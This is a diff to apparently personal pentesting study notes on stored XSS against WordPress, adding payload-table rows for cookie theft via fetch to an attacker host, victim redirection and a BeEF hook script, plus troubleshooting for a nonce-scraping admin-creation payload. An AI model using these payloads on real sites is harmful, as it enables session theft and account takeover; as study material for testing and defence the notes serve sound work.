@@ -16,6 +16,9 @@ tags:
 > | Cookie steal | `<script>document.location='http://<LHOST>/?c='+document.cookie</script>` |
 > | Attribute inject | `" onmouseover="alert(1)` |
 > | Filter bypass | `<ScRiPt>alert(1)</ScRiPt>` |
+> | Cookie steal (fetch) | `<script>fetch('http://<LHOST>/?c='+document.cookie)</script>` |
+> | Redirect victim | `<script>window.location='http://<LHOST>'</script>` |
+> | BeEF hook | `<script src="http://<LHOST>:3000/hook.js"></script>` |
 
 ## Decision Tree
 
@@ -63,10 +66,19 @@ flowchart TD
 > - Create-user request rejected → you are missing or using a stale **nonce** (the anti-CSRF token); fetch a fresh one from `/wp-admin/user-new.php` in the same payload before POSTing.
 > - Payload breaks when sent → unencoded special characters mangle the request; minify then encode with `String.fromCharCode` so no bad characters interfere. See [[🔣 Encoding Reference]].
 > - The User-Agent shows blank in the Visitors table → expected, because the value is wrapped in `<script>` tags and executed rather than displayed.
+> - `Uncaught TypeError: Cannot read properties of null (reading '1')` on `nonceMatch[1]` → the regex didn't match anything, usually because the WordPress version/theme changed the surrounding HTML around the nonce field. View source on `/wp-admin/user-new.php`, find the actual `name="_wpnonce_create-user" value="..."` markup, and adjust `nonceRegex` to match it.
+> - Nothing happens and no new user appears, with no obvious error → open the payload in the browser console by hand (unminified, un-encoded) first and step through it; it's much easier to debug the raw JS than a `String.fromCharCode` blob sitting inside a `User-Agent` header.
 > Full list: [[⚠️ Common Errors & Troubleshooting]]
 
 > [!tip] Beginner note
 > A **nonce** is a one-time random token WordPress adds to forms to stop CSRF — an outside attacker can't guess it. But our JavaScript is already running *inside* the admin's authenticated page, so it can simply read the valid nonce off the page and reuse it, which is why the anti-CSRF protection doesn't stop a stored-XSS attack.
+
+> [!tip] BeEF as an alternative to hand-rolled payloads
+> Writing and minifying custom nonce-scraping JS works, but the Browser Exploitation Framework (BeEF) automates this whole class of attack. Hook the victim's browser with:
+> ```html
+> <script src="http://<LHOST>:3000/hook.js"></script>
+> ```
+> Once hooked, BeEF's web UI exposes ready-made modules (get cookies, log keystrokes, redirect, even some CSRF-token-aware modules) without you writing raw `XMLHttpRequest` code by hand — useful when the target app doesn't have a known public exploit for admin creation.
 
 ## Resources
 - [HackTricks — XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
